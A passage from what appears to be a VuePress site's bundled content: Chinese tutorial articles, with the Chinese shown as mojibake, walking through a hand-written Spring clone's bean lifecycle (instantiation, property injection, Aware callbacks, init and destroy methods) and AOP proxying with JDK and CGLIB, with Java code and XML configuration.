(beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® bean å±æ§ä¹åï¼åè®¸ beanpostprocessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // ç» bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applypropertyvalues(beanname, bean, beandefinition);\n            // æ§è¡ bean çåå§åæ¹æ³å beanpostprocessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("instantiation of bean failed", e);\n        }\n        // æ³¨åå®ç°äº disposablebean æ¥å£ç bean å¯¹è±¡\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // å¤æ­ scope_singletonãscope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreatebeaninstance ä½¿ç¨äº cglib æ¥å®ä¾åä¸ä¸ª bean, ä¹å¯ä»¥ä½¿ç¨ java èªå¸¦çåå°\n\n    protected object createbeaninstance(beandefinition beandefinition, string beanname, object[] args) {\n        constructor constructortouse = null;\n        class<?> beanclass = beandefinition.getbeanclass();\n        constructor<?>[] declaredconstructors = beanclass.getdeclaredconstructors();\n        for (constructor ctor : declaredconstructors) {\n            if (null != args && ctor.getparametertypes().length == args.length) {\n                constructortouse = ctor;\n                break;\n            }\n        }\n        return getinstantiationstrategy().instantiate(beandefinition, beanname, constructortouse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ncglib å®ç°å®ä¾å\n\n@override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        enhancer enhancer = new enhancer();\n        enhancer.setsuperclass(beandefinition.getbeanclass());\n        enhancer.setcallback(new noop() {\n            @override\n            public int hashcode() {\n                return super.hashcode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getparametertypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njava åå°å®ç°åºåå\n\n    @override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        class clazz = beandefinition.getbeanclass();\n        try {\n            if (null != ctor) {\n                return clazz.getdeclaredconstructor(ctor.getparametertypes()).newinstance(args);\n            } else {\n                return clazz.getdeclaredconstructor().newinstance();\n            }\n        } catch (nosuchmethodexception | instantiationexception | illegalaccessexception | invocationtargetexception e) {\n            throw new beansexception("failed to instantiate [" + clazz.getname() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# æ³¨è§£å±æ§å¡«å\n\næ³¨è§£å±æ§ï¼ä¼ä»ä¹åæ³¨åç beanpostprocessor éå¹é instantiationawarebeanpostprocessor çå¯¹è±¡ï¼å¶ä¸­é»è®¤ç autowiredannotationbeanpostprocessor å·ä½å®ç°äºè¯¥ç±»\n\n    protected void applybeanpostprocessorsbeforeapplyingpropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                propertyvalues pvs = ((instantiationawarebeanpostprocessor) beanpostprocessor).postprocesspropertyvalues(beandefinition.getpropertyvalues(), bean, beanname);\n                if (null != pvs) {\n                    for (propertyvalue propertyvalue : pvs.getpropertyvalues()) {\n                        beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nautowiredannotationbeanpostprocessor æç¥æ³¨è§£å±æ§å¡«å\n\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) throws beansexception {\n        class<?> clazz = bean.getclass();\n        clazz = classutils.iscglibproxyclass(clazz) ? clazz.getsuperclass() : clazz;\n        // è·å¾å¯¹è±¡ææå­æ®µ\n        field[] declaredfields = clazz.getdeclaredfields();\n        for (field field : declaredfields) {\n            // @value æ³¨è§£\n            value valueannotation = field.getannotation(value.class);\n            if (null != valueannotation) {\n                object value = valueannotation.value();\n                // è§£æå¾å°å¼\n                value = beanfactory.resolveembeddedvalue((string) value);\n                // ç±»åè½¬æ¢\n                class<?> sourcetype = value.getclass();\n                class<?> targettype = (class<?>) typeutil.gettype(field);\n                // å¯¹å¼è¿è¡è½¬æ¢å¤ç\n                conversionservice conversionservice = beanfactory.getconversionservice();\n                if (conversionservice != null) {\n                    if (conversionservice.canconvert(sourcetype, targettype)) {\n                        value = conversionservice.convert(value, targettype);\n                    }\n                }\n                // æå¼è®¾ç½®è¿å»\n                beanutil.setfieldvalue(bean, field.getname(), value);\n            }\n        }\n        // 2. å¤çæ³¨è§£ @autowired\n        for (field field : declaredfields) {\n            autowired autowiredannotation = field.getannotation(autowired.class);\n            if (null != autowiredannotation) {\n                class<?> fieldtype = field.gettype();\n                string dependentbeanname = null;\n                qualifier qualifierannotation = field.getannotation(qualifier.class);\n                object dependentbean = null;\n                if (null != qualifierannotation) {\n                    dependentbeanname = qualifierannotation.value();\n                    dependentbean = beanfactory.getbean(dependentbeanname, fieldtype);\n                } else {\n                    dependentbean = beanfactory.getbean(fieldtype);\n                }\n                beanutil.setfieldvalue(bean, field.getname(), dependentbean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# xml å±æ§å¡«å\n\nxml å±æ§å¡«åè¿éè¯´è¿ä¼åºç°å¾ªç¯ä¾èµçé®é¢ï¼å¨å®ä¾åé¶æ®µçååå·²ç»å¯¹è¿ä¸ªå¤çäºï¼åç»­ä¼åç¬è®²è§£\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a ä¾èµ bï¼è·å b çå®ä¾å\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // ç±»åè½¬æ¢\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception("error setting property valuesï¼" + beanname + " messageï¼" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æç¥å¯¹è±¡\n\næç¥å¯¹è±¡åä¸ºä¸ä¸ªæ©å±æ¥å£ï¼åªè¦æä»¬ç bean å®ç°äºè¿äºæ¥å£ï¼å°±å¯ä»¥ä¸ºæä»¬ç bean æä¾é¢å¤çè½å\n\n    private object initializebean(string beanname, object bean, beandefinition beandefinition) {\n        // invokeawaremethodsï¼æç¥å¯¹è±¡ï¼\n        if (bean instanceof aware) {\n            if (bean instanceof beanfactoryaware) {\n                ((beanfactoryaware) bean).setbeanfactory(this);\n            }\n            if (bean instanceof beanclassloaderaware) {\n                ((beanclassloaderaware) bean).setbeanclassloader(getbeanclassloader());\n            }\n            if (bean instanceof beannameaware) {\n                ((beannameaware) bean).setbeanname(beanname);\n            }\n        }\n        // 1. æ§è¡ beanpostprocessor before å¤ç\n        object wrappedbean = applybeanpostprocessorsbeforeinitialization(bean, beanname);\n        // æ§è¡ bean å¯¹è±¡çåå§åæ¹æ³\n        try {\n            invokeinitmethods(beanname, wrappedbean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("invocation of init method of bean[" + beanname + "] failed", e);\n        }\n        // 2. æ§è¡ beanpostprocessor after å¤ç\n        wrappedbean = applybeanpostprocessorsafterinitialization(wrappedbean, beanname);\n        return wrappedbean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# åå§åæ¹æ³ä¹å\n\nå¨ bean çåå§åæ¹æ³ä¹åè°ç¨ï¼é»è®¤æä¾äº applicationcontext çä¸ä¸ææ³¨å¥ï¼å½æä¸ªç±»å®ç°äº applicationcontextawareï¼å°±æä¾ applicationcontext ä¸ä¸æçè½åï¼åªæ¯æä»¬è¦å®ç°çæ¯ applicationcontextaware ï¼å¹¶ä¸æ¯ beanpostprocessor\n\n    @override\n    public object applybeanpostprocessorsbeforeinitialization(object existingbean, string beanname) throws beansexception {\n        object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessbeforeinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) throws beansexception {\n        if (bean instanceof applicationcontextaware){\n            ((applicationcontextaware) bean).setapplicationcontext(applicationcontext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# bean çåå§åæ¹æ³\n\nbean åå§åæ¹æ³è¿æ¯æ¯è¾ç®åçï¼ä¸»è¦æ¯éè¿å¤æ­æ¯å¦å®ç° initializingbean æ¥å£ï¼å¦æå®ç°äºï¼åè°ç¨å®ä¾åå¯¹è±¡å®ç°ç afterpropertiesset æ¹æ³ãå¦æä¸æ¯ä»¥æ¥å£å®ç°çï¼æ¯ä»¥ xml æè¿°çï¼åæ¯éè¿åå°çæ¹å¼è°ç¨è¯¥æ¹æ³ã\n\n    private void invokeinitmethods(string beanname, object bean, beandefinition beandefinition) throws exception {\n        // 1. å®ç°æ¥å£ initializingbean\n        if (bean instanceof initializingbean) {\n            ((initializingbean) bean).afterpropertiesset();\n        }\n\n        // 2. æ³¨è§£éç½® init-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        string initmethodname = beandefinition.getinitmethodname();\n        if (strutil.isnotempty(initmethodname)) {\n            method initmethod = beandefinition.getbeanclass().getmethod(initmethodname);\n            if (null == initmethod) {\n                throw new beansexception("could not find an init method named \'" + initmethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            initmethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userdao" class="cn.bugstack.springframework.test.bean.userdao" init-method="initdatamethod" destroy-method="destroydatamethod"/>\n\n\n1\n\n\n\n# åå§åæ¹æ³ä¹å\n\n    @override\n    public object applybeanpostprocessorsafterinitialization(object existingbean, string beanname) throws beansexception {\n        object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessafterinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æ³¨åéæ¯äºä»¶\n\néæ¯äºä»¶éè¦ bean å®ç° disposablebean æ¥å£å¹¶éå destroy () æ¹æ³ãå¦ä¸åæ¯æå®ç° disposablebean ææå¨ xml æè¿°è¿éæ¯æ¹æ³çæ³¨åå°ä¸ä¸ªå®¹å¨éã\n\n    protected void registerdisposablebeanifnecessary(string beanname, object bean, beandefinition beandefinition) {\n        // é singleton ç±»åç bean ä¸æ§è¡éæ¯æ¹æ³\n        if (!beandefinition.issingleton()) return;\n        if (bean instanceof disposablebean || strutil.isnotempty(beandefinition.getdestroymethodname())) {\n            registerdisposablebean(beanname, new disposablebeanadapter(bean, beanname, beandefinition));\n        }\n    }\n\n    public void registerdisposablebean(string beanname, disposablebean bean) {\n        disposablebeans.put(beanname, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nç¶ååæ´ä¸ªå¯å¨è¿ç¨ç»æè°ç¨ registershutdownhook æ¹æ³æ·»å ä¸ä¸ªé©å­çå¬ã\n\n    @override\n    public void registershutdownhook() {\n        // java ä¸­çä¸ä¸ªæ¹æ³ï¼å®ç¨äºæ³¨å jvm å³é­æ¶è¦æ§è¡çç¹å®ä»£ç åãå½ jvm å³å°å³é­æ¶ï¼è¿äºä»£ç åä¼è¢«æ§è¡ï¼ä»¥ä¾¿è¿è¡æ¸çãéæ¾èµæºç­æä½ã\n        // è¿äºä»£ç åéå¸¸ç§°ä¸ºâé©å­ï¼hookï¼âï¼å æ­¤è¯¥æ¹æ³ä¹è¢«ç§°ä¸ºâæ·»å å³é­é©å­ï¼add shutdown hookï¼âã\n        runtime.getruntime().addshutdownhook(new thread(this::close));\n    }\n\n    @override\n    public void close() {\n        // åå¸å®¹å¨å³é­äºä»¶\n        publishevent(new contextclosedevent(this));\n        // æ§è¡éæ¯åä¾beançéæ¯æ¹æ³\n        getbeanfactory().destroysingletons();\n    }\n\n    public void destroysingletons() {\n        set<string> keyset = this.disposablebeans.keyset();\n        object[] disposablebeannames = keyset.toarray();\n\n        for (int i = disposablebeannames.length - 1; i >= 0; i--) {\n            object beanname = disposablebeannames[i];\n            disposablebean disposablebean = disposablebeans.remove(beanname);\n            try {\n                disposablebean.destroy();\n            } catch (exception e) {\n                throw new beansexception("destroy method on bean with name \'" + beanname + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @override\n    public void destroy() throws exception {\n        // 1. å®ç°æ¥å£ disposablebean\n        if (bean instanceof disposablebean) {\n            ((disposablebean) bean).destroy();\n        }\n        // 2. æ³¨è§£éç½® destroy-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        if (strutil.isnotempty(destroymethodname) && !(bean instanceof disposablebean && "destroy".equals(this.destroymethodname))) {\n            method destroymethod = bean.getclass().getmethod(destroymethodname);\n            if (null == destroymethod) {\n                throw new beansexception("couldn\'t find a destroy method named \'" + destroymethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            destroymethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop å¤çåä¾\n\n    public void registersingleton(string beanname, object singletonobject) {\n        // ä¸çº§ç¼å­\n        singletonobjects.put(beanname, singletonobject);\n        // äºçº§ç¼å­\n        earlysingletonobjects.remove(beanname);\n        // ä¸çº§ç¼å­\n        singletonfactories.remove(beanname);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ AOP",frontmatter:{title:"æ ¸å¿åå®¹æè§£ AOP",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/201.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20AOP.html",relativePath:"00.java/20.Spring/21.spring/201.æ ¸å¿åå®¹æè§£ AOP.md",key:"v-1a1b5d5b",path:"/spring/spring/201/",headers:[{level:2,title:"AOP",slug:"aop",normalizedTitle:"aop",charIndex:2},{level:3,title:"å°è£",slug:"å°è£",normalizedTitle:"å°è£",charIndex:2882},{level:3,title:"æå°è£çèå¥å° Spring ä¸­",slug:"æå°è£çèå¥å°-spring-ä¸­",normalizedTitle:"æå°è£çèå¥å° spring ä¸­",charIndex:5234}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"AOP å°è£ æå°è£çèå¥å° Spring ä¸­",content:'# AOP\n\nAOP çè¯çå¯ä»¥è¿½æº¯å°ä¸ä¸çºª 90 å¹´ä»£åæï¼å®ææ©ç± Gregor Kiczales ç­äººæåºï¼å¹¶å¨ 1997 å¹´åè¡¨äºç»å¸çè®ºæ Aspect-Oriented Programmingãåæ¥ï¼AspectJ æä¸ºäº Java çæä¸­ä½¿ç¨æå¹¿æ³ç AOP æ¡æ¶ä¹ä¸ã\n\nAOP çç®çæ¯ä¸ºäºè§£å³å¨ OOPï¼é¢åå¯¹è±¡ç¼ç¨ï¼ä¸­é¾ä»¥å¤ççæ¨ªåå³æ³¨ç¹é®é¢ï¼å³å°ç³»ç»ä¸å¡é»è¾ä»£ç ä¸å¶ä»éä¸å¡åè½ï¼å¦æ¥å¿è®°å½ãæ§è½ç»è®¡ãå®å¨æ§å¶ç­ï¼åç¦»å¼æ¥ãAOP éè¿æè¿äºéä¸å¡åè½ç¬ç«åºæ¥ï¼å¨éè¦æ¶å¨æå°æ¤å¥å°ç³»ç»ä¸­ï¼ä»èå®ç°å¯¹ä¸å¡é»è¾çæ ä¾µå¥å¼å¢å¼ºã\n\nAOP çæ ¸å¿å¨äºå¶è½å¤å°ä¸å¡é»è¾ä¸éä¸å¡åè½åç¦»å¼æ¥ï¼ä»èéä½äºä»£ç çè¦ååº¦ï¼å¹¶ä¸æ¯æå¨è¿è¡æ¶å¨æå°æ¤å¥åç§»é¤åé¢ãè¿æ ·ä¸æ¥ï¼å°±å¯ä»¥å®ç°æ´å çµæ´»ãå¯ç»´æ¤åå¯æ©å±çç³»ç»ã\n\nAOP çå·ä½è¡¨ç°åæ¬åé¢ï¼Aspectï¼ãè¿æ¥ç¹ï¼Join Pointï¼ãéç¥ï¼Adviceï¼ãåç¹ï¼Pointcutï¼åå¼å¥ï¼Introductionï¼ç­æ¦å¿µãå¶ä¸­ï¼åé¢æ¯ææ¨ªè·¨å¤ä¸ªå¯¹è±¡çéç¨åè½ï¼è¿æ¥ç¹æ¯ç¨åºæ§è¡è¿ç¨ä¸­è½å¤æå¥åé¢çç¹ï¼éç¥åæ¯å®ä¹äºåé¢å¨è¿æ¥ç¹å¤ææ§è¡çæä½ï¼åç¹åæ¯ä¸ä¸ªè°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ï¼å¼å¥åæ¯ä¸ºæä¸ªå¯¹è±¡æ·»å æ°çæ¥å£å®ç°ãå·ä½å¦ä¸ä»£ç ï¼\n\n    public void test_proxy_method() {\n        // ç®æ å¯¹è±¡(å¯ä»¥æ¿æ¢æä»»ä½çç®æ å¯¹è±¡)\n        Object targetObj = new UserService();\n        // AOP ä»£ç\n        IUserService proxy = (IUserService) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), targetObj.getClass().getInterfaces(), new InvocationHandler() {\n            // æ¹æ³å¹éå¨\n            MethodMatcher methodMatcher = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))");\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                if (methodMatcher.matches(method, targetObj.getClass())) {\n                    // æ¹æ³æ¦æªå¨\n                    MethodInterceptor methodInterceptor = invocation -> {\n                        long start = System.currentTimeMillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            System.out.println("çæ§ - Begin By AOP");\n                            System.out.println("æ¹æ³åç§°ï¼" + invocation.getMethod().getName());\n                            System.out.println("æ¹æ³èæ¶ï¼" + (System.currentTimeMillis() - start) + "ms");\n                            System.out.println("çæ§ - End\\r\\n");\n                        }\n                    };\n                    // åå°è°ç¨\n                    return methodInterceptor.invoke(new ReflectiveMethodInvocation(targetObj, method, args));\n                }\n                return method.invoke(targetObj, args);\n            }\n        });\n        String result = proxy.queryUserInfo();\n        System.out.println("æµè¯ç»æï¼" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nè¿æ®µä»£ç ä½¿ç¨äº JDK å¨æä»£çå®ç° AOP çåè½ï¼æ²¡æä½¿ç¨ Spring æä¾çæ¹æ³ãç±»åæ³¨è§£ç­ã\n\n * è¿æ¥ç¹ï¼è¿æ¥ç¹æ¯å¨ç®æ å¯¹è±¡ä¸å¹éçç¹å®ç¹ï¼è¿éçè¿æ¥ç¹æ¯ IUserService æ¥å£ä¸­çæææ¹æ³ï¼ç±äºä½¿ç¨äº targetObj.getClass ().getInterfaces () è·åç®æ å¯¹è±¡æå®ç°çæ¥å£ï¼å æ­¤åªæ¦æªäº IUserService æ¥å£ä¸­çæ¹æ³ã\n * åé¢ï¼åé¢æ¯ä¸ä¸ªæ¨¡ååçæ¨ªåå³æ³¨ç¹ï¼å¨è¿éæä»¬å¯ä»¥è§ä¸ºæ²¡ææ¾å¼å®ä¹çåé¢ãèæ¯ç´æ¥å¨ InvocationHandler.invoke () ä¸­å®ç°äºæ¦æªåå¢å¼ºé»è¾ï¼åæ¬æ¹æ³å¹éå¨ãæ¹æ³æ¦æªå¨ååå°è°ç¨ç­ã\n * åç¹ï¼åç¹æ¯ä¸ç§è°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ãè¿éä½¿ç¨äº AspectJ è¡¨è¾¾å¼ "execution (* cn.bugstack.springframework.test.bean.IUserService.*(..))"ï¼å®å¹éäº IUserService æ¥å£ä¸­çæææ¹æ³ã\n * éç¥ï¼éç¥ç±»ååæ¬åç½®éç¥ãåç½®éç¥ãç¯ç»éç¥ãæåºéç¥åæç»éç¥ãå¨è¿éä½¿ç¨äºç¯ç»éç¥ï¼å³å¨æ¹æ³æ§è¡ä¹ååä¹åæ·»å äºçæ§é»è¾ã\n * å¼å¥ï¼å¼ä»éå¸¸æ¯ä¸ä¸ªç¹æ®çéç¥ç±»åï¼å®åè®¸å¨è¿è¡æ¶ä¸ºç±»å¨æå°æ·»å æ°æ¥å£å®ç°ãè¿éæ²¡æä½¿ç¨å¼ä»ã\n\n\n# å°è£\n\nå¨ Spring ä¸­ï¼æ ¸å¿é»è¾æ¯ç¦»ä¸å¼ä¸é¢çä»£çä¾å­çï¼åªæ¯ç¸å¯¹åºåäºäºå°è£ï¼æä»¬åç¨ç±»å¾æ¥ç®åè¯´æä¸å°è£å³ç³»ï¼\n\n\n\nç¨æµè¯ä¾å­æ¥è¯´ææ¯æ­¥çæ ¸å¿\n\n    /**\n     * åç¹è¡¨è¾¾å¼ï¼æ¥éªè¯åç¹\n     * @throws NoSuchMethodException\n     */\n    @Test\n    public void test_aop() throws NoSuchMethodException {\n        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.UserService.*(..))");\n        Class<UserService> clazz = UserService.class;\n        Method method = clazz.getDeclaredMethod("queryUserInfo");\n        System.out.println("åç¹æ¯å¦åå«è¯¥ç±»ï¼" + pointcut.matches(clazz));\n        System.out.println("åç¹æ¯å¦åå«è¯¥ç±»è¯¥æ¹æ³ï¼" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * åé¢ å å¨æä»£ç\n     */\n    @Test\n    public void test_dynamic() {\n        // ç®æ å¯¹è±¡\n        IUserService userService = new UserService();\n        // ç»è£ä»£çä¿¡æ¯ï¼åé¢\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        // è®¾ç½®ä»£çç®æ å¯¹è±¡\n        advisedSupport.setTargetSource(new TargetSource(userService));\n        // è®¾ç½®æ¦æªå¨\n        advisedSupport.setMethodInterceptor(new UserServiceInterceptor());\n        // å¹éä»£çå¯¹è±¡\n        advisedSupport.setMethodMatcher(new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"));\n        // ä»£çå¯¹è±¡(JdkDynamicAopProxy)\n        IUserService proxy_jdk = (IUserService) new JdkDynamicAopProxy(advisedSupport).getProxy();\n        // æµè¯è°ç¨\n        System.out.println("æµè¯ç»æï¼" + proxy_jdk.queryUserInfo());\n        // ä»£çå¯¹è±¡(Cglib2AopProxy)\n        IUserService proxy_cglib = (IUserService) new Cglib2AopProxy(advisedSupport).getProxy();\n        // æµè¯è°ç¨\n        System.out.println("æµè¯ç»æï¼" + proxy_cglib.register("è±è±"));\n    }\n\npublic class UserServiceInterceptor implements MethodInterceptor {\n    @Override\n    public Object invoke(MethodInvocation invocation) throws Throwable {\n        long start = System.currentTimeMillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            System.out.println("çæ§ - Begin By AOP");\n            System.out.println("æ¹æ³åç§°ï¼" + invocation.getMethod());\n            System.out.println("æ¹æ³èæ¶ï¼" + (System.currentTimeMillis() - start) + "ms");\n            System.out.println("çæ§ - End\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# æå°è£çèå¥å° Spring ä¸­\n\nå³ä¾§é¨åå°±æ¯æè¿°äºæ´ä¸ªèåå° Spring ä¸­çç±»ï¼ä¼å¨ Bean åå»ºçè¿ç¨ä¸­ åå§åæ¹æ³ä¹å è¿ä¸ªçå½å¨æååæ¾å°æ¯å¦æä¾äº DefaultAdvisorAutoProxyCreator ç±»çæ¯æï¼å ä¸ºä»æè¿°äºå·ä½ä»£çç±»çè¿ç¨ã\n\n> ä¸ºä»ä¹ä¼å¨åå§åæ¹æ³ä¹åæè¿è¡ä»£çï¼æ¯å ä¸ºä»£çç±»ä¹éè¦çå±æ§ä¹éè¦è¢«å¡«åï¼æä»¥ç­å¡«åå®æ¯åå¨ä»£ç\n\n\n\næ ¸å¿æ¹æ³ï¼æè¿°äºæ´ä¸ªç±»è¢«ä»£ççè¿ç¨\n\n    protected Object wrapIfNecessary(Object bean, String beanName) {\n        // å¤æ­Beanæ¯å¦æ¯Adviceï¼Pointcutï¼Advisorçå­ç±»æèä¸¤ç±»ç¸åå¯ä»¥ç¸äºè½¬ï¼ç±»å±é¢ï¼ï¼ç¨æ·å®ä¹çç±»é½æ¯ false\n        if (isInfrastructureClass(bean.getClass())) return bean;\n        // å¾å°æ³¨åçAspectJExpressionPointcutAdvisor\n        Collection<AspectJExpressionPointcutAdvisor> advisors = beanFactory.getBeansOfType(AspectJExpressionPointcutAdvisor.class).values();\n        for (AspectJExpressionPointcutAdvisor advisor : advisors) {\n            ClassFilter classFilter = advisor.getPointcut().getClassFilter();\n            // ç¨è¡¨è¾¾å¼ è¿æ»¤å¹éç±»\n            if (!classFilter.matches(bean.getClass())) continue;\n            // å°è£\n            AdvisedSupport advisedSupport = new AdvisedSupport();\n            TargetSource targetSource = new TargetSource(bean);\n            advisedSupport.setTargetSource(targetSource);\n            advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice());\n            advisedSupport.setMethodMatcher(advisor.getPointcut().getMethodMatcher());\n            advisedSupport.setProxyTargetClass(true);\n            // è¿åä»£çå¯¹è±¡\n            return new ProxyFactory(advisedSupport).getProxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- ç®æ ç±» --\x3e\n    <bean id="userService" class="cn.bugstack.springframework.test.bean.UserService"/>\n    \x3c!-- ä»£çç±» --\x3e\n    <bean id="beforeAdvice" class="cn.bugstack.springframework.test.bean.UserServiceBeforeAdvice"/>\n    \x3c!-- ç»ä»¶ç±»ï¼è³å³éè¦ --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"/>\n    \x3c!-- \n        è¿éæ¯  advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice()); è®¾ç½®æ¦æªå¨ï¼\n        å¯ä»¥æ¯åç½®æ¦æªï¼åç½®æ¦æªï¼æèç¯ç»æ¦æª\n     --\x3e\n    <bean id="methodInterceptor" class="cn.bugstack.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor">\n        <property name="advice" ref="beforeAdvice"/>\n    </bean>\n    \x3c!-- åé¢è¡¨è¾¾å¼ --\x3e\n    <bean id="pointcutAdvisor" class="cn.bugstack.springframework.aop.aspectj.AspectJExpressionPointcutAdvisor">\n        <property name="expression" value="execution(* 